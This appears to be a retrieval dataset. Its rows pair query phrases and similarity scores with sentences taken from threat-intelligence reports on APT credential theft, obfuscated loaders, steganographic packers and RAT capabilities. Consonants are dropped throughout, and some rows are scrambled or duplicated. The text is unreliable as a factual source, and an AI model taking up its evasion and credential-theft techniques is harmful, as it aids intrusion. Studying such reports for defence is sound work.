litle visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator acount or any other combination of acounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especialy infrequent destinations for acounts.']"
7a70ba0573c3747eb8c7b89216436246,AdFind was renamed to masquerade as a legitimate Windows binary,0.924692749819526,"['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShel script from the PowerShel Operational event log as the scripts execution was loged automaticaly due to the use of specific keywords.', 'CrowdStrike recomends that organizations upgrade PowerShel on their systems, as this functionality is only available with PowerShel version 5 and above.', 'In adition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAcount , the threat actor also executed a renamed version of AdFind to output domain reconaisance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In adition to using scripted comands, operators were repeatedly observed manualy executing several standard PowerShel cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of acounts posesing particular privileges in this case, the ability to make VPN conections that would be subject to later credential stealing atempts and leveraged to aces the victim at a later time.', 'Pasword Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and esentialy pick up where they left of, even though the organization had performed an enterprise-wide pasword reset, including a reset of al service acounts and the double-reset of the krbtgt acount.', 'CrowdStrike determined that in these cases, administrative users had reset their own pasword to the same pasword they previously used, esentialy nulifying the impact of the enterprise-wide reset.']"
07447feab95478f8fcc0cbd0d028f9f5,AdFind was renamed to masquerade as a legitimate Windows binary,0.924692749819526,"['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShel script from the PowerShel Operational event log as the scripts execution was loged automaticaly due to the use of specific keywords.', 'CrowdStrike recomends that organizations upgrade PowerShel on their systems, as this functionality is only available with PowerShel version 5 and above.', 'In adition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAcount , the threat actor also executed a renamed version of AdFind to output domain reconaisance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In adition to using scripted comands, operators were repeatedly observed manualy executing several standard PowerShel cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of acounts posesing particular privileges in this case, the ability to make VPN conections that would be subject to later credential stealing atempts and leveraged to aces the victim at a later time.', 'Pasword Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and esentialy pick up where they left of, even though the organization had performed an enterprise-wide pasword reset, including a reset of al service acounts and the double-reset of the krbtgt acount.', 'CrowdStrike determined that in these cases, administrative users had reset their own pasword to the same pasword they previously used, esentialy nulifying the impact of the enterprise-wide reset.']"
7a70ba0573c3747eb8c7b89216436246,the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.,0.8203778549621877,"['Credential Refresh On some investigations, the dwel time of the threat actor spaned years.', 'Given this extended period, it is logical to asume that some credentials obtained by the threat actor would be rotated during normal busines operations.', 'To combat this, the threat actor periodicaly refreshed their credential set by performing credential theft activities in an already compromised environment.', 'At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a diferent credential theft technique.', 'One of the credential theft techniques identified by CrowdStrike was the use of a PowerShel script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShel script from the PowerShel Operational event log as the scripts execution was loged automaticaly due to the use of specific keywords.', 'CrowdStrike recomends that organizations upgrade PowerShel on their systems, as this functionality is only available with PowerShel version 5 and above.', 'In adition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAcount , the threat actor also executed a renamed version of AdFind to output domain reconaisance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.']"
07447feab95478f8fcc0cbd0d028f9f5,the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.,0.8203778549621877,"['Credential Refresh On some investigations, the dwel time of the threat actor spaned years.', 'Given this extended period, it is logical to asume that some credentials obtained by the threat actor would be rotated during normal busines operations.', 'To combat this, the threat actor periodicaly refreshed their credential set by performing credential theft activities in an already compromised environment.', 'At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a diferent credential theft technique.', 'One of the credential theft techniques identified by CrowdStrike was the use of a PowerShel script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShel script from the PowerShel Operational event log as the scripts execution was loged automaticaly due to the use of specific keywords.', 'CrowdStrike recomends that organizations upgrade PowerShel on their systems, as this functionality is only available with PowerShel version 5 and above.', 'In adition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAcount , the threat actor also executed a renamed version of AdFind to output domain reconaisance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt the payload,0.7914700872077616,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
7997dfdead64fb5df02becc197608577,"Manipulates (creates, lists, starts, stops and deletes) services.",0.9716068673165894,"['Gopuram was aditionaly observed to launch in- memory modules.', 'Just like the implants used in the 3CX campaign, Gopurams modules are DL files that include an export function named DlGetClasObject.', 'We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument.', 'Conects to a given host via a socket and waits for the server to Conect send data.', 'Registry Manipulates registry (lists, ads, deletes and exports keys).', 'Service Manipulates (creates, lists, starts, stops and deletes) services.', 'Timestomp Performs timestomping on files.', 'Performs payload injections through syscals via maping a Inject shelcode to a remote proces and creating a remote thread.', 'Kernel Driver Utility that alows an atacker to bypas driver signature enforcement.', 'The utility is used to load an unsigned driver KDU (MD5: F684E10F1FCD32C62E73A1382896).', 'The driver colects information about instaled AV filters and writes it to the C:\\Windows\\System32\\catrot2\\edb.chk.log file.']"
6b9097140a8dbbe45811fb825b6708e7,user,1.0,"['Conect-AzureAD Get-AzureADuser -Identity <UPN> | Revoke-AzureADUserAlRefreshToken FIGURE 30.', 'PowerShel comands to conect to Azure AD and revoke existing refresh tokens.', 'MANDIANT Remediation and Hardening Strategies for Microsoft 365 to Defend Against APT29 28 Atack Technique: Hijack Azure AD Aplications Azure Aplications and Service Principals Overview Aplications are created in Azure AD to provide API aces to There are two diferent models when asigning permisions for Microsoft 365 data by third parties.', 'Diferent terms are used to aplications to aces an API: refer to aplications depending on how they are created and Delegated Permisions, also known as how they are interacted with.', 'This section defines these terms OAuth2PermisionGrants, enable an aplication to perform before a discusion of the threat actor techniques and how to API operations that aces or manipulate data on behalf of a protect against them.', 'signed-in user.', 'A user must sign-in and consent to, or alow, Ap Registrations, also known as Aplications or Aplication the aplication to aces data on their behalf.', 'An administrator Objects, define the initial instance of an aplication, including can also consent on the behalf of al users.', 'Delegated API permisions, aplication secrets, and branding elements.', 'permisions are out of scope for this white paper.', 'The ap registration resides in the tenant where it was Aplication Permisions, also known as ApRoles and created.']"
ada82bdfef2120b94a738f5131c478c2,user,0.7958088118956365,"['in the devices hardware or circuit board.', 'with unsecured code, creating significant and OT devices.', 'In adition, some devices have The solution is partnership.', 'Together with Over the past few years, we have sen vulnerabilities which can be exploited to take firmware that is not cryptographicaly signed, supliers and global governments, Microsoft increased targeting of firmware to launch over the device or inject malicious code into enabling them to be updated without verification is comited to adresing security acros our devastating atacks.', 'As firmware is likely to the firmware.', 'from the user.', 'These weakneses further open the suply chain ecosystem, exceding demands continue to be a valuable target for threat devices up to suply chain atacks throughout This risk is compounded when it comes to from customers and regulators alike.', 'To do actors, organizations must protect against the suply chain.', 'Most devices are built using the production and distribution chain.', 'this, we are driving a comprehensive aproach firmware hacking.', 'software and hardware components from To adres these threats, Microsoft invests to security and operational resiliency that is numerous manufacturers as wel as open- significantly in ensuring the security and integrity flexibly deployed acros the suply chain.']"
f5391b8bd48a8c1328ceee79fe55f20a,user,0.8075684644408572,"['Her the acounts last-known trusted device or question its dominance.', 'In the security measures had a critical flaw, or IP.)', 'jargon of political philosophy, this because they uterly depended on her She personaly had never activated uter domination (to the point of having aces to the physical device.', 'A 2FA on the Gogle acount (it sems unconsciousnes) is caled hegemony.', 'bureaucratic rigmarole with her celular inapropriate to say her acount at provider ultimately concluded in her this point).', 'But, because of changes in The banalization of spyware, as geting a kiosk clerk to perform for the infosec landscape (both at Gogle marked by the terms departure her the equivalent of a SIM swap: thus, and in general) in the intervening years from the public discourse, is a prime proving that Any adversary could have UNREDACTED MAGAZINE / Q1 2023 16 (e.g., the legacy of the 2010 Operation on or of without your knowledge, is stil asumed by the user.', 'Because, Aurora hack), as wel as Gogles but it provides hyperlinks only once just imagine, statisticaly, how many amalgamation of al its services like again back to the basic Two-step unrecovered acounts must exist, some Gmail and YouTube under one general verification info page.', 'subset of which have expired domains.', 'Gogle acount circa 2015, Gogle And some subset of those acounts by now had unilateraly imposed a Finaly, of course, there isnt any wil have weak paswords, or wil have stricter security policy onto al of its readily available Gogle customer usernames and paswords that match user acounts.', 'In the intervening years, service to speak of.', 'Its just an endles up to breached acount datasets from Gogle had probably at some point labyrinth of more DIY steps and some other service.']"
466c2154d2a970279cbacddb0f4d1773,encryption,0.8336321668492042,"['But the number of representational posibilities available to a quantum computer expands exponentialy (thre qubits have 2^3, or eight states, four qubits have 2^4, or 16 states, etc.).', 'And thats just the start.', 'Qudits (the d representing a variable number of dimensions) take this concept even further.', 'In 2017, for example, scientists at the National Institute of Scientific Research constructed a pair of qudits with 10 diferent states each, providing more computational power than six qubits.', 'Compound that by milions of qubits (or qudits), and the potential computational power of a quantum computer sems limitles.', 'From a cybersecurity perspective, quantum computers wil play a potentialy devastating role in undermining the efectivenes of things like data encryption.', 'Quantum computers wil quickly render asymetric encryption algorithms obsolete.', '(These are the algorithms used to sign information to ensure data integrity, perform key exchanges to enable confidentiality algorithms to scramble data, and to verify authenticity of people or data.)', 'In fact, it is being predicted that quantum computers wil break eliptical curve cryptography by 2027.', '6 WHITE PAPER | Cyber Threat Predictions for 2021 Of course, quantum computers are not curently comercialy available, at least not to the usual asortment of cyber criminals most organizations are concerned with.', 'However, they stil have one colosal benefactornation-states.']"
8eb1f16e59328363d2929e47b8c6c819,encryption,1.0,"['2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.', 'The new version has ben modified to evade previous detection methods.']"
8eb1f16e59328363d2929e47b8c6c819,encryption,1.0,"['2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.', 'The new version has ben modified to evade previous detection methods.']"
5781b38155642213a5742de08d81aefc,encryption,0.8336321668492042,"['4-5 Figure A-1.', 'Anex C, Apendix 12 .A-16 Figure D-1.', 'Cyber mision force team alocations .', 'D-6 Figure D-2.', 'National electromagnetic spectrum operations organizational structure.', '.', 'D-9 Figure E-1.', 'Routing proces when requesting ofensive cyberspace operations suport .E-3 Figure E-2.', 'Routing proces when requesting defensive cyberspace operations-internal defensive measures suport .E-5 Figure E-3.', 'Routing proces for defensive cyberspace operations-internal defensive measures (non-Department of Defense information network) and defensive cyberspace operations-response actions suport.E-6 Figure E-4.', 'Joint tactical airstrike request form.']"
cbc4ac68f5373159751e25d3110f9ddc,encryption,0.7669039515735961,"['TLP:WHITE IDENTIFICATION OF A NEW CYBER CRIMINAL GROUP: LOCKEAN Version1.0 October26,2021 TLP:WHITE TLP:WHITE Identificationofanewcybercriminalgroup: Lockean Table of contents 1 Context: linksbetwenseveralincidentswithintheFrenchremit .', '.', '.', '.', '.', '.', '.']"
caaf54f566e7989273f85f3676e4df50,encryption,1.0,"['However, the data on any other drives is easily acesible.', 'cd ~/Downloads In the past, I have encouraged readers to create an encrypted VeraCrypt adb instal com.anonyome.', 'container on the external drives and mysudo_1.8.0-13894_ store al data securely within it.', 'This is minAPI24(x86_64)(nodpi)_ stil valid advice, but there are other apkmiror.com options.', 'Lately, I have ben relying You should now se the MySudo on Linux Unified Key Setup (LUKS) for aplication within the Anbox emulator.', 'encryption.', 'From within Pop!_OS or However, I want a traditional program many other Linux builds, open the Disks icon within my aplications menu.', 'I aplication, select the target drive, click executed the folowing within Terminal.', 'the setings icon, chose the Format Partition option, select the internal ln -s ~/snap/anbox/comon/ Ext4 option, enable the Pasword ap-data/aplications/anbox protect volume feature, and asign ~/.local/share/aplications/ a very secure pasword.', 'The entire anbox external drive is now encrypted.', 'The benefit is that you do not ned third- I can now ad the MySudo icon to party decryption software to aces my Dock and execute a traditional your data.']"
cfcfd781a4d12781c5f0b6a223e4cd99,regular RAR archives that have an executable file inside.,0.8920760140532812,"['The atacks described in that article were conected to cybercrime, not espionage.', 'While we have not sen any payload delivered by the atackers other than RATs, some of the targets in the curent campaign (such as a lotery agency) dont make much sense for spying activities.', 'These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and dont develop any themselves.', 'Atack overview Targets are aproached with emails that lead to the download of malicious files.', 'In most cases, these emails have a PDF document atached, which contains a link that the user must click to download the malware.', 'The downloaded files are regular RAR archives that have an executable file inside.', 'These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.', 'The target has to manualy extract the file and execute it for the malware to run.', 'Weve found a variety of packers used for these executables, but their purpose is always to have a remote aces trojan runing on the victimized computer, usualy by decrypting the payload and injecting it into legitimate proceses.', 'An overview of a typical atack is shown in Figure 1.', 'We have sen the atackers use thre diferent RATs: Remcos, njRAT and AsyncRAT.']"
cfcfd781a4d12781c5f0b6a223e4cd99,reads data from its own resource section and decrypts a payload.,0.9820354352310707,"['Even though there are diferences in al the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can sumarize the actions taken by the dropers as folows: The droper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DL that wil be loaded and caled in the same adres space.', 'The DL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same adres space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pas, the payload can be injected into a new proces or loaded in the same proces space.', 'The initial droper is coded in C#.', 'In al the samples that we have sen, the code for the droper was hiding in non-malicious code, probably copied from other aps.', 'The benign code is not executed; its there to evade detection.', '7/15 In Figure 16 we se an example of the resources contained in one of these dropers.']"
cfcfd781a4d12781c5f0b6a223e4cd99,is packed with CyaX,0.8742284314609418,"['Interestingly, the atackers use various payloads, but none of them are Agent Tesla.', 'Even though there are diferences in al the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can sumarize the actions taken by the dropers as folows: The droper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DL that wil be loaded and caled in the same adres space.', 'The DL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same adres space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pas, the payload can be injected into a new proces or loaded in the same proces space.', 'The initial droper is coded in C#.', 'In al the samples that we have sen, the code for the droper was hiding in non-malicious code, probably copied from other aps.', 'The benign code is not executed; its there to evade detection.']"
cfcfd781a4d12781c5f0b6a223e4cd99,.NET packer known as CyaX,0.8290416134366543,"['Then it decrypts the aray by doing a single- byte XOR operation, cycling through the key.', 'After that, the aray is gzip-decompresed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15 Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and runing the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the atackers is v4, although they used v2 in some cases.', 'Figure 18 shows the hardcoded configuration for one of their samples.', 'Figure 18.', 'Hardcoded configuration in CyaX-Sharp packer The decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.', 'Once its decrypted, it can be run in the same adres space or injected into a diferent proces, depending on the configuration.']"
0d16866e038b536ca4f0c6571a6cb84e,decrypting,0.7989849760451059,"['Every multiple APT groups operate under, or are resourced by, the ShadowPad sample that we have sen has a rot module same digital quartermaster canot be ruled out for various designed to orchestrate the next set of modules, including a sets of threat actors.', 'In 2021, we continued to observe plugins module that can then be customised depending on this phenomenon, whether through observations of shared the functionality that the threat actor requires.', 'The plugins capability (malware, techniques, exploits, and so on), or can enable capabilities that may include, among others, C2 through overlaps in infrastructure (either through the same comunications over HTP or TCP, keyloging, screnshot paterns observed on C2s, or the reuse of domains/IPs by gathering, port maping, and system information gathering.6 other threat actors).', 'In tracking standard ShadowPad samples in 2021, Of Shadows and Proxies: China-based threat actors we identified and analysed a new variant, which we sharing tols cal ScaterBe: samples of ShadowPad that had ben The continued sharing of tols and techniques is a runing obfuscated using a custom technique.7 Likely in order to theme among China-based threat actors.', 'While not al of the minimise detection on victim networks, the ScaterBe China-based threat actors share tols with one another, and packing mechanism implements control flow obfuscation, not al of them have aces to the same tols, quartermaster string encoding, dynamic API resolutions, several anti- arangements (covered in more detail in a later section) analysis techniques, as wel as shelcode decoding/ continue to complicate atribution of activity.', 'For example, decrypting.', 'We ases that one or more users of ShadowPad the same malware families (such as PlugX, PoisonIvy, have aces to ScaterBe, and have highly likely delivered ShadowPad, Quarian, and the Winti backdor) are used by some of these malicious payloads via watering hole atacks multiple China-based threat actors, and, as has become very on sites that are used to deliver Adobe Flash update files.', 'We wel known in 2021 with the ProxyLogon incidents, some ases that most ScaterBe payloads can be directly linked threat actors share exploits as wel.', 'back to the threat actor we track as Red Dev 10 (aka Earth Lusca), and have ben used to target organisations in the We note that while not al of these threat actors have ben aerospace and defence sectors.', 'observed having aces to the shared tols detailed below, these are prime examples of the dynamic We ases ShadowPad to be highly likely used by at least described in this section.', '1 China-based threat actors.8 Our analysis into specific subsets of ShadowPad infrastructure alowed us to identify a wide set of victims, ranging from India-based entities in the telecomunications and oil and gas sectors, to East Asian branches of international humanitarian organisations.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt,1.0,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
cfcfd781a4d12781c5f0b6a223e4cd99,"decrypts the array by doing a single-byte XOR operation, cycling through the key",0.7897307223466735,"['The text in gren (only shown partialy) is a string that wil be decrypted to generate the next stage to be executed and the image that we se below the gren text wil be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.', 'Figure 16.', 'Resources contained in Agent Teslas packer The method to be executed in the DL is always named StartGame or StartUpdate.', 'It reads the image from the first executable, and stores every pixel as thre numbers acording to its red, gren and blue components.', 'Then it decrypts the aray by doing a single- byte XOR operation, cycling through the key.', 'After that, the aray is gzip-decompresed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15 Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and runing the payload.', 'The .NET packer known as CyaX is used to perform this task.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt the payload,0.7914700872077616,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
cfcfd781a4d12781c5f0b6a223e4cd99,reads pixels from an image contained in the first binary,0.8335235404706605,"['These wil be described later in the Payloads section.', 'Agent Tesla packers We have sen several dropers that are diferent variants of a packer that uses steganography and is known to be used in Agent Tesla samples.', 'Interestingly, the atackers use various payloads, but none of them are Agent Tesla.', 'Even though there are diferences in al the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can sumarize the actions taken by the dropers as folows: The droper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DL that wil be loaded and caled in the same adres space.', 'The DL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same adres space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pas, the payload can be injected into a new proces or loaded in the same proces space.', 'The initial droper is coded in C#.']"
cfcfd781a4d12781c5f0b6a223e4cd99,have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data,0.8309108946775662,"['Escalation Mechanism: Bypas User Aces Control Defense T140 Deobfuscate/Decode Files The atackers have used various encryption algorithms in their Evasion or Information dropers to hide strings and payloads.', 'T1562.01 Impair Defenses: Disable or The atackers have used CyaX packer, which can disable Windows Modify Tols Defender.', 'T1070.04 Indicator Removal on Host: The atackers have used malware that deletes itself from the system.', 'File Deletion T12 Modify Registry The atackers have used RATs that alow ful aces to the Registry, for example to clear traces of their activities.', 'T1027.02 Obfuscated Files or The atackers have used various layers of packers for obfuscating Information: Software their dropers.', 'Packing T1027.03 Obfuscated Files or The atackers have used packers that read pixel data from images Information: Steganography contained in PE files resource sections and build the next layer of execution from the data.', 'T105.02 Proces Injection: Portable The atackers have used dropers that inject the payload into Executable Injection legitimate proceses such as RegAsm.exe, MSBuild.exe and more.', 'T1497.01 Virtualization/Sandbox The atackers have used dropers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tols.', 'Credential T15.03 Credentials from Pasword The atackers have used various RATs with modules that steal Aces Stores: Credentials from paswords saved in victim web browsers.', 'Web Browsers 14/15 Tactic ID Name Description Discovery T1010 Aplication Window The atackers have used dropers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The atackers have used various RATs that can browse file systems.']"
cfcfd781a4d12781c5f0b6a223e4cd99,used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder,0.780657064689625,[]
da720a0b860cc8b213511d0e3c6beb1b,Download and execute files,0.765362825600171,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
da720a0b860cc8b213511d0e3c6beb1b,Download and execute files,0.765362825600171,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
db2220059c0ca8d39dca806b090053e1,exfiltration of files,0.8555673253360516,"['ESET Research white papers TLP: WHITE JUMPING THE AIR GAP: 15 years of nation-state efort Authors: Alexis Dorais-Joncas Facundo Munz December 2021 2 JUMPING THE AIR GAP: 15 years of nation-state efort TLP: WHITE TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
5518f123e0610a71173f98d2a79b34ec,exfiltration of files,0.8012401378112921,"['Educate users that wil make that more dificult).', 'Lok for unusual if their phone sudenly loses service, they should proces tres.', '(A god endpoint protection treat that as a potential security problem as wel tol should catch this itself, but you should as an availability problem.', 'Require that devices stil ensure youre runing down investigative being used for corporate authentication (even leads from time to time rather than just closing personaly owned devices) be locked with a PIN everything as a false positive to kep the metrics against port-out and SIM changes in the mobile god.)', 'And try to alert on unusual storage usage, cariers systems.', 'to catch staging for exfiltration.', 'Watch acount creation and reactivation.', 'Alert on new acount creation that doesnt quite fit naming conventions.', 'Alert and escalate on old or intentionaly disabled privileged acounts being reactivated.', '13 Spotlight On: Mudled Libra Incident Response Report 2024 Know Your Aplications Sumarizing the If you se red-teaming tols in your environment, make sure there is an Adversary authorized red-team engagement underway.', 'One SOC we worked with had a company logo sticker on the wal for each red team theyd caught.']"
cfcfd781a4d12781c5f0b6a223e4cd99,used various RATs that can browse file systems,0.7557901026376463,"['Packing T1027.03 Obfuscated Files or The atackers have used packers that read pixel data from images Information: Steganography contained in PE files resource sections and build the next layer of execution from the data.', 'T105.02 Proces Injection: Portable The atackers have used dropers that inject the payload into Executable Injection legitimate proceses such as RegAsm.exe, MSBuild.exe and more.', 'T1497.01 Virtualization/Sandbox The atackers have used dropers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tols.', 'Credential T15.03 Credentials from Pasword The atackers have used various RATs with modules that steal Aces Stores: Credentials from paswords saved in victim web browsers.', 'Web Browsers 14/15 Tactic ID Name Description Discovery T1010 Aplication Window The atackers have used dropers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The atackers have used various RATs that can browse file systems.', 'T120 Peripheral Device Discovery The atackers have used njRAT, which atempts to detect if the victim system has a camera during the initial infection.', 'T1057 Proces Discovery The atackers have used various RATs with modules that show runing proceses.', 'T1012 Query Registry The atackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The atackers have used njRAT, which can identify remote hosts on conected networks.', 'T1518.01 Software Discovery: Security The atackers have used dropers that check for security software Software 